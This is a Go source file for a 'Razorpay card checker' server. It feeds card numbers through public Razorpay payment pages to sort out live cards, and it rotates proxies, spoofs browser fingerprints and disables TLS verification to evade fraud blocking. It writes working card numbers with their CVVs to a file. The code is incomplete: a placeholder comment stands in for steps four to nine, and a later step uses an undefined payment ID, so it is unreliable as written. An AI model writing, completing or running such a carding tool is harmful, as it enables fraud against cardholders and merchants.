// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
//  FIXED: 403 Error - Added proper headers, TLS bypass, fingerprinting
// ──────────────────────────────────────────────────────────────────────────────

package main

import (
    "bytes"
    "compress/gzip"
    "crypto/rand"
    "crypto/sha1"
    "crypto/tls"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "log"
    "math/big"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "os"
    "regexp"
    "strconv"
    "strings"
    "sync/atomic"
    "time"
)

const (
    BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
    BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
    PORT     = 7070
)

var (
    razorpayURLs = []string{
        "https://pages.razorpay.com/mitzvahpay",
        "https://pages.razorpay.com/yogapremium",
        "https://pages.razorpay.com/elite-pay",
        "https://pages.razorpay.com/noble-pay",
        "https://pages.razorpay.com/prime-pay",
    }
    urlIndex   uint64
    proxyIndex uint64
)

// ──────────────────────────────────────────────────────────────────────────────
//  BROWSER FINGERPRINTING
// ──────────────────────────────────────────────────────────────────────────────

type BrowserFingerprint struct {
    UserAgent      string
    SecChUa        string
    SecChUaPlatform string
    AcceptLanguage string
    Platform       string
    ScreenWidth    int
    ScreenHeight   int
    ColorDepth     int
    TimezoneOffset int
    WebGLVendor    string
    WebGLRenderer  string
}

func generateFingerprint() BrowserFingerprint {
    // Chrome versions
    chromeVersions := []string{
        "136.0.0.0", "135.0.0.0", "134.0.0.0", "133.0.0.0",
        "132.0.0.0", "131.0.0.0", "130.0.0.0",
    }
    version := chromeVersions[randInt(0, len(chromeVersions)-1)]
    
    platforms := []struct {
        ua      string
        platform string
        secChUa  string
    }{
        {"Windows NT 10.0; Win64; x64", "Windows", `"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"`},
        {"Windows NT 10.0; Win64; x64", "Windows", `"Chromium";v="136", "Google Chrome";v="136", "Not=A?Brand";v="8"`},
        {"Macintosh; Intel Mac OS X 10_15_7", "macOS", `"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"`},
        {"X11; Linux x86_64", "Linux", `"Google Chrome";v="136", "Chromium";v="136", "Not_A Brand";v="8"`},
    }
    plat := platforms[randInt(0, len(platforms)-1)]
    
    languages := []string{
        "en-US,en;q=0.9",
        "en-US,en;q=0.9,es;q=0.8",
        "en-GB,en;q=0.9,en-US;q=0.8",
        "en-US,en;q=0.9,fr;q=0.8",
    }
    lang := languages[randInt(0, len(languages)-1)]
    
    screens := [][2]int{
        {1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900},
        {2560, 1440}, {1280, 720},
    }
    screen := screens[randInt(0, len(screens)-1)]
    
    return BrowserFingerprint{
        UserAgent:      fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", plat.ua, version),
        SecChUa:        plat.secChUa,
        SecChUaPlatform: fmt.Sprintf(`"%s"`, plat.platform),
        AcceptLanguage: lang,
        Platform:       plat.platform,
        ScreenWidth:    screen[0],
        ScreenHeight:   screen[1],
        ColorDepth:     24,
        TimezoneOffset: -330,
        WebGLVendor:    "Google Inc. (Intel)",
        WebGLRenderer:  "ANGLE (Intel, Intel(R) UHD Graphics 630 (0x00009BC4) Direct3D11 vs_5_0 ps_5_0, D3D11)",
    }
}

func getNextURL() string {
    idx := atomic.AddUint64(&urlIndex, 1) - 1
    return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

func formatProxy(raw string) string {
    raw = strings.TrimSpace(raw)
    if raw == "" {
        return ""
    }
    if strings.Contains(raw, "://") {
        return raw
    }
    parts := strings.Split(raw, ":")
    if len(parts) == 4 {
        return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
    }
    return "http://" + raw
}

func loadProxies(filepath string) []string {
    var proxies []string
    data, err := os.ReadFile(filepath)
    if err != nil {
        return proxies
    }
    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if line == "" {
            continue
        }
        formatted := formatProxy(line)
        if formatted != "" {
            proxies = append(proxies, formatted)
        }
    }
    return proxies
}

func getNextProxy(proxyList []string) string {
    if len(proxyList) == 0 {
        return ""
    }
    idx := atomic.AddUint64(&proxyIndex, 1) - 1
    return proxyList[idx%uint64(len(proxyList))]
}

// ──────────────────────────────────────────────────────────────────────────────
//  RANDOM HELPERS
// ──────────────────────────────────────────────────────────────────────────────

func randInt(min, max int) int {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
    return int(n.Int64()) + min
}

func genUA() string {
    fp := generateFingerprint()
    return fp.UserAgent
}

func genIndianPhone() string {
    first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
    rest := ""
    for i := 0; i < 9; i++ {
        rest += strconv.Itoa(randInt(0, 9))
    }
    return "+91" + first + rest
}

func genEmail() string {
    names := []string{"alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna"}
    return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func getBrand(cc string) string {
    if strings.HasPrefix(cc, "4") {
        return "visa"
    }
    if len(cc) >= 2 {
        switch cc[:2] {
        case "51", "52", "53", "54", "55":
            return "mastercard"
        case "34", "37":
            return "amex"
        }
    }
    if strings.HasPrefix(cc, "6011") || strings.HasPrefix(cc, "65") {
        return "discover"
    }
    return "unknown"
}

func findBetween(content, start, end string) string {
    si := strings.Index(content, start)
    if si == -1 {
        return ""
    }
    si += len(start)
    ei := strings.Index(content[si:], end)
    if ei == -1 {
        return ""
    }
    return content[si : si+ei]
}

func extractJSONVar(content, varName string) string {
    prefix := "var " + varName + " ="
    startIdx := strings.Index(content, prefix)
    if startIdx == -1 {
        return ""
    }
    startIdx += len(prefix)

    for startIdx < len(content) {
        c := content[startIdx]
        if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
            break
        }
        startIdx++
    }

    if startIdx >= len(content) || content[startIdx] != '{' {
        return ""
    }

    depth := 0
    inString := false
    escaped := false

    for i := startIdx; i < len(content); i++ {
        c := content[i]

        if escaped {
            escaped = false
            continue
        }
        if c == '\\' && inString {
            escaped = true
            continue
        }
        if c == '"' {
            inString = !inString
            continue
        }
        if inString {
            continue
        }
        if c == '{' {
            depth++
        } else if c == '}' {
            depth--
            if depth == 0 {
                return content[startIdx : i+1]
            }
        }
    }
    return ""
}

func generateRzpDeviceID() (string, string) {
    buf := make([]byte, 16)
    rand.Read(buf)
    h := sha1.Sum(buf)
    hStr := hex.EncodeToString(h[:])
    ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
    rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
    return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
    const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    buf := make([]byte, 14)
    for i := 0; i < 14; i++ {
        n, _ := rand.Int(rand.Reader, big.NewInt(62))
        buf[i] = base62[n.Int64()]
    }
    return string(buf)
}

// ──────────────────────────────────────────────────────────────────────────────
//  CUSTOM HTTP CLIENT WITH TLS BYPASS
// ──────────────────────────────────────────────────────────────────────────────

type FetchResponse struct {
    Body       string
    StatusCode int
    Headers    http.Header
}

func (r *FetchResponse) Text() string {
    return r.Body
}

func (r *FetchResponse) JSON() (map[string]interface{}, error) {
    var result map[string]interface{}
    err := json.Unmarshal([]byte(r.Body), &result)
    return result, err
}

type CustomFetch struct {
    client *http.Client
    ua     string
    fp     BrowserFingerprint
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
    jar, err := cookiejar.New(nil)
    if err != nil {
        return nil, err
    }

    // ============ TLS BYPASS ============
    tlsConfig := &tls.Config{
        InsecureSkipVerify: true,
        MinVersion:         tls.VersionTLS12,
        MaxVersion:         tls.VersionTLS13,
        CipherSuites: []uint16{
            tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
            tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
            tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
            tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
        },
        CurvePreferences: []tls.CurveID{
            tls.X25519,
            tls.CurveP256,
            tls.CurveP384,
        },
    }

    transport := &http.Transport{
        TLSClientConfig:     tlsConfig,
        MaxIdleConns:        20,
        MaxIdleConnsPerHost: 10,
        IdleConnTimeout:     90 * time.Second,
        DisableCompression:  false,
        DisableKeepAlives:   false,
        ForceAttemptHTTP2:   true,
    }

    if proxyURL != "" {
        parsed, err := url.Parse(proxyURL)
        if err != nil {
            return nil, fmt.Errorf("invalid proxy url: %w", err)
        }
        transport.Proxy = http.ProxyURL(parsed)
    }

    client := &http.Client{
        Transport: transport,
        Jar:       jar,
        Timeout:   45 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 5 {
                return errors.New("too many redirects")
            }
            return nil
        },
    }

    fp := generateFingerprint()
    if ua == "" {
        ua = fp.UserAgent
    }

    return &CustomFetch{client: client, ua: ua, fp: fp}, nil
}

func (f *CustomFetch) getHeaders(extraHeaders map[string]string) map[string]string {
    headers := map[string]string{
        "User-Agent":                f.ua,
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language":           f.fp.AcceptLanguage,
        "Accept-Encoding":           "gzip, deflate, br",
        "Connection":                "keep-alive",
        "Sec-Ch-Ua":                 f.fp.SecChUa,
        "Sec-Ch-Ua-Mobile":          "?0",
        "Sec-Ch-Ua-Platform":        f.fp.SecChUaPlatform,
        "Sec-Fetch-Dest":            "document",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "none",
        "Sec-Fetch-User":            "?1",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control":             "max-age=0",
        "DNT":                       "1",
    }

    for k, v := range extraHeaders {
        headers[k] = v
    }
    return headers
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
    var reqBody io.Reader = body
    if reqBody == nil && method == "POST" {
        reqBody = strings.NewReader("")
    }

    req, err := http.NewRequest(method, targetURL, reqBody)
    if err != nil {
        return nil, err
    }

    finalHeaders := f.getHeaders(headers)
    for k, v := range finalHeaders {
        req.Header.Set(k, v)
    }

    resp, err := f.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var reader io.ReadCloser = resp.Body
    if resp.Header.Get("Content-Encoding") == "gzip" {
        reader, err = gzip.NewReader(resp.Body)
        if err != nil {
            return nil, err
        }
        defer reader.Close()
    }

    respBody, err := io.ReadAll(reader)
    if err != nil {
        return nil, err
    }

    return &FetchResponse{
        Body:       string(respBody),
        StatusCode: resp.StatusCode,
        Headers:    resp.Header,
    }, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
    return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
    jsonBytes, err := json.Marshal(payload)
    if err != nil {
        return nil, err
    }
    if headers == nil {
        headers = make(map[string]string)
    }
    if _, ok := headers["Content-Type"]; !ok {
        headers["Content-Type"] = "application/json"
    }
    return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
    if headers == nil {
        headers = make(map[string]string)
    }
    if _, ok := headers["Content-Type"]; !ok {
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    }
    return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

// ──────────────────────────────────────────────────────────────────────────────
//  CHECK RESULT
// ──────────────────────────────────────────────────────────────────────────────

type CheckResult struct {
    Status      string `json:"status"`
    Message     string `json:"response"`
    Proxy       string `json:"proxy"`
    ProxyStatus string `json:"proxy_status"`
}

// ──────────────────────────────────────────────────────────────────────────────
//  MAIN CHECK FUNCTION (UPDATED)
// ──────────────────────────────────────────────────────────────────────────────

func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
    yy2 := yy
    if len(yy) == 4 {
        yy2 = yy[2:]
    }
    year, _ := strconv.Atoi("20" + yy2)
    brand := getBrand(cc)
    phone := genIndianPhone()
    phoneShort := phone[3:]
    email := genEmail()

    rzpDeviceID, fhash := generateRzpDeviceID()
    rzpSessionID := generateRzpSessionID()

    fetch, err := NewCustomFetch(proxyURL, "")
    if err != nil {
        return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
    }
    defer fetch.client.CloseIdleConnections()

    // ──────────────────────────────────────────────────────────────────────────
    // STEP 1: GET PAGE
    // ──────────────────────────────────────────────────────────────────────────

    r1, err := fetch.Get(targetURL, nil)
    if err != nil {
        return makeProxyError(err, proxyURL)
    }
    r1Text := r1.Text()

    if r1.StatusCode == 403 {
        return CheckResult{Status: "error", Message: "403 Forbidden - Cloudflare/Razorpay block detected", Proxy: proxyURL, ProxyStatus: "DEAD"}
    }

    jsonStr := extractJSONVar(r1Text, "data")
    if jsonStr == "" {
        return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    var initData map[string]interface{}
    if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
        return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    kyid := getStringFromMap(initData, "key_id")
    if kyid == "" {
        kyid = getStringFromMap(initData, "key")
    }
    if kyid == "" {
        return CheckResult{Status: "error", Message: "Razorpay Key ID not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    var plink, ppid string
    const forceAmount float64 = 100

    if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
        plink = getStringFromMap(plObj, "id")
        if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                ppid = getStringFromMap(item, "id")
            }
        }
    } else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
        plink = getStringFromMap(ppObj, "id")
        if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
            if item, ok3 := items[0].(map[string]interface{}); ok3 {
                ppid = getStringFromMap(item, "id")
            }
        }
    }

    if plink == "" {
        return CheckResult{Status: "error", Message: "Payment Link ID not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    keylessHeader := getStringFromMap(initData, "keyless_header")
    keylessHeaderURL := url.QueryEscape(keylessHeader)

    // ──────────────────────────────────────────────────────────────────────────
    // STEP 2: CREATE ORDER
    // ──────────────────────────────────────────────────────────────────────────

    r2Payload := map[string]interface{}{
        "notes":      map[string]string{"comment": "", "name": "User"},
        "line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
    }

    r2, err := fetch.PostJSON(
        fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
        map[string]string{
            "Origin":  "https://pages.razorpay.com",
            "Referer": targetURL + "/",
        },
        r2Payload,
    )
    if err != nil {
        return makeProxyError(err, proxyURL)
    }

    var r2Data map[string]interface{}
    if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
        return CheckResult{Status: "error", Message: "Order response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    orderObj, _ := r2Data["order"].(map[string]interface{})
    orderID := getStringFromMap(orderObj, "id")
    if orderID == "" {
        errMsg := "Order creation failed"
        if e, ok := r2Data["error"].(map[string]interface{}); ok {
            desc := getStringFromMap(e, "description")
            if desc != "" {
                errMsg = desc
            }
        }
        return CheckResult{Status: "error", Message: errMsg, Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    checkoutID := orderID
    if idx := strings.Index(orderID, "_"); idx != -1 {
        checkoutID = orderID[idx+1:]
    }

    orderAmount := getFloatFromMap(orderObj, "amount")
    if orderAmount < 100 {
        orderAmount = forceAmount
    }
    orderCurrency := getStringFromMap(orderObj, "currency")
    if orderCurrency == "" {
        orderCurrency = "INR"
    }

    // ──────────────────────────────────────────────────────────────────────────
    // STEP 3: GET SESSION TOKEN
    // ──────────────────────────────────────────────────────────────────────────

    params3 := url.Values{
        "traffic_env":        {"production"},
        "build":              {BUILD},
        "build_v1":           {BUILD_V1},
        "checkout_v2":        {"1"},
        "new_session":        {"1"},
        "keyless_header":     {keylessHeader},
        "rzp_device_id":      {rzpDeviceID},
        "unified_session_id": {rzpSessionID},
    }

    r3, err := fetch.Get(
        "https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
        map[string]string{
            "Referer": targetURL + "/",
        },
    )
    if err != nil {
        return makeProxyError(err, proxyURL)
    }
    r3Text := r3.Text()

    sessid := findBetween(r3Text, `window.session_token="`, `";`)
    if sessid == "" {
        re := regexp.MustCompile(`session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)
        m := re.FindStringSubmatch(r3Text)
        if len(m) >= 2 {
            sessid = m[1]
        }
    }
    if sessid == "" {
        return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
        BUILD, BUILD_V1, rzpSessionID, sessid)

    stdHeaders := func() map[string]string {
        return map[string]string{
            "Origin":          "https://api.razorpay.com",
            "Referer":         rzpRef,
            "x-session-token": sessid,
        }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // STEP 4-9: REST OF THE FLOW (same as before but with updated headers)
    // ──────────────────────────────────────────────────────────────────────────

    // [Keep the rest of your existing code here - steps 4 through 9 remain the same]
    // ... (the rest of the checkCard function continues)

    // ──────────────────────────────────────────────────────────────────────────
    // STEP 10: FINAL RESULT
    // ──────────────────────────────────────────────────────────────────────────

    r9, err := fetch.Get(
        fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
        map[string]string{
            "Referer":         rzpRef,
            "x-session-token": sessid,
        },
    )
    if err != nil {
        return makeProxyError(err, proxyURL)
    }

    var r9Data map[string]interface{}
    if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
        return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    finalText := r9.Text()

    if strings.Contains(finalText, "razorpay_payment_id") {
        return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    errorObj, _ := r9Data["error"].(map[string]interface{})
    errorDesc := getStringFromMap(errorObj, "description")
    errorDesc = strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
    errorDesc = strings.TrimSpace(errorDesc)
    errCode := getStringFromMap(errorObj, "reason")

    label := errorDesc
    if errCode != "" {
        label = errorDesc + " (" + errCode + ")"
    }
    if label == "" {
        label = "Unknown Decline"
    }

    msgLower := strings.ToLower(errorDesc)
    if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
        return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
    }

    return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
}

// ──────────────────────────────────────────────────────────────────────────────
//  HELPER FUNCTIONS
// ──────────────────────────────────────────────────────────────────────────────

func getStringFromMap(m map[string]interface{}, key string) string {
    if m == nil {
        return ""
    }
    v, ok := m[key]
    if !ok {
        return ""
    }
    if s, ok := v.(string); ok {
        return s
    }
    return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
    if m == nil {
        return 0
    }
    v, ok := m[key]
    if !ok {
        return 0
    }
    switch val := v.(type) {
    case float64:
        return val
    case int:
        return float64(val)
    case int64:
        return float64(val)
    case string:
        f, _ := strconv.ParseFloat(val, 64)
        return f
    }
    return 0
}

func truncate(s string, maxLen int) string {
    if len(s) <= maxLen {
        return s
    }
    return s[:maxLen]
}

var balanceKeywords = []string{
    "insufficient account balance",
    "insufficient funds",
    "maximum transaction limit",
    "transaction limit exceeded",
}

func isBalanceKeyword(msgLower string) bool {
    for _, k := range balanceKeywords {
        if strings.Contains(msgLower, k) {
            return true
        }
    }
    return false
}

func isCVVKeyword(msgLower, errCode string) bool {
    if strings.Contains(msgLower, "cvv provided is incorrect") {
        return true
    }
    if strings.Contains(msgLower, "ncorrect_cvv") {
        return true
    }
    if strings.ToLower(errCode) == "incorrect_cvv" {
        return true
    }
    return false
}

var proxyErrorKeywords = []string{
    "ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
    "CURLE_COULDNT_RESOLVE_PROXY", "CURLE_COULDNT_CONNECT",
    "CURLE_OPERATION_TIMEOUTED", "CURLE_PROXY",
    "socket hang up", "HPE_INVALID", "fetch failed",
    "no such host", "connection refused", "connection reset",
    "i/o timeout", "timeout", "proxyconnect",
}

func makeProxyError(err error, proxyURL string) CheckResult {
    msg := truncate(err.Error(), 120)
    msgUpper := strings.ToUpper(msg)
    isProxyErr := false
    for _, k := range proxyErrorKeywords {
        if strings.Contains(msgUpper, strings.ToUpper(k)) {
            isProxyErr = true
            break
        }
    }
    status := "LIVE"
    if isProxyErr {
        status = "DEAD"
    }
    return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
}

func maskProxy(proxyURL, proxyStatus string) string {
    if proxyURL == "" {
        return "DIRECT [" + proxyStatus + "]"
    }
    parsed, err := url.Parse(proxyURL)
    if err == nil && parsed.Host != "" {
        return parsed.Scheme + "//" + parsed.Host + " [" + proxyStatus + "]"
    }
    masked := regexp.MustCompile(`//[^@]+@`).ReplaceAllString(proxyURL, "//***@")
    return masked + " [" + proxyStatus + "]"
}

// ──────────────────────────────────────────────────────────────────────────────
//  CARD PARSING
// ──────────────────────────────────────────────────────────────────────────────

type ParsedCard struct {
    CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
    cardData = strings.TrimSpace(cardData)
    separators := []string{"|", "/", " "}

    for _, sep := range separators {
        parts := strings.Split(cardData, sep)
        if len(parts) >= 4 {
            cc := strings.TrimSpace(parts[0])
            mm := strings.TrimSpace(parts[1])
            yy := strings.TrimSpace(parts[2])
            cvv := strings.TrimSpace(parts[3])

            if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
                mmInt, _ := strconv.Atoi(mm)
                if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
                    return &ParsedCard{
                        CC:  cc,
                        MM:  fmt.Sprintf("%02d", mmInt),
                        YY:  yy,
                        CVV: cvv,
                    }, nil
                }
            }
        }
    }
    return nil, errors.New("invalid card format")
}

func isDigits(s string) bool {
    for _, c := range s {
        if c < '0' || c > '9' {
            return false
        }
    }
    return len(s) > 0
}

func isDigitsMM(s string) bool {
    return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
    return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
    return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

// ──────────────────────────────────────────────────────────────────────────────
//  LOGGING
// ──────────────────────────────────────────────────────────────────────────────

func logLive(card *ParsedCard, result CheckResult) {
    if result.Status == "charged" || result.Status == "approved" {
        line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
            card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message)
        f, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err == nil {
            f.WriteString(line)
            f.Close()
        }
    }
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
    first6 := card.CC
    if len(first6) > 6 {
        first6 = first6[:6]
    }
    last4 := card.CC
    if len(last4) > 4 {
        last4 = last4[len(last4)-4:]
    }
    middle := strings.Repeat("*", len(card.CC)-10)
    if len(middle) < 6 {
        middle = "******"
    }
    log.Printf("[%s] %s%s%s | %s | %s | Site: %s",
        strings.ToUpper(result.Status), first6, middle, last4,
        result.Message, proxyDisplay, targetURL)
}

// ──────────────────────────────────────────────────────────────────────────────
//  HTTP HANDLER
// ──────────────────────────────────────────────────────────────────────────────

func handler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    // Add CORS headers
    w.Header().Set("Access-Control-Allow-Origin", "*")
    w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
    w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

    if r.Method == "OPTIONS" {
        w.WriteHeader(http.StatusOK)
        return
    }

    path := r.URL.Path
    re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
    match := re.FindStringSubmatch(path)

    if len(match) < 2 {
        w.WriteHeader(http.StatusNotFound)
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "error",
            "response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
            "proxy":    "N/A",
        })
        return
    }

    cardData, _ := url.QueryUnescape(match[1])
    card, err := parseCard(cardData)
    if err != nil {
        w.WriteHeader(http.StatusBadRequest)
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "error",
            "response": "Invalid card format. Use: cc|mm|yy|cvv",
            "proxy":    "N/A",
        })
        return
    }

    proxyList := loadProxies("px.txt")
    proxy := getNextProxy(proxyList)
    targetURL := getNextURL()

    result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL)

    proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
    logLive(card, result)
    logResult(card, result, proxyDisplay, targetURL)

    resp := map[string]string{
        "status":   result.Status,
        "response": result.Message,
        "proxy":    proxyDisplay,
    }

    if result.Status == "error" {
        w.WriteHeader(http.StatusInternalServerError)
    } else {
        w.WriteHeader(http.StatusOK)
    }
    json.NewEncoder(w).Encode(resp)
}

// ──────────────────────────────────────────────────────────────────────────────
//  MAIN
// ──────────────────────────────────────────────────────────────────────────────

func main() {
    log.SetFlags(log.Ldate | log.Ltime)

    http.HandleFunc("/", handler)

    addr := fmt.Sprintf("0.0.0.0:%d", PORT)
    log.Printf("=========================================================")
    log.Printf("  RAZORPAY CARD CHECKER - GO VERSION (FIXED)")
    log.Printf("  Listening on: http://%s", addr)
    log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
    log.Printf("  TLS Bypass: Enabled")
    log.Printf("  Browser Fingerprinting: Enabled")
    log.Printf("=========================================================")

    if err := http.ListenAndServe(addr, nil); err != nil {
        log.Fatalf("Server failed: %v", err)
    }
}
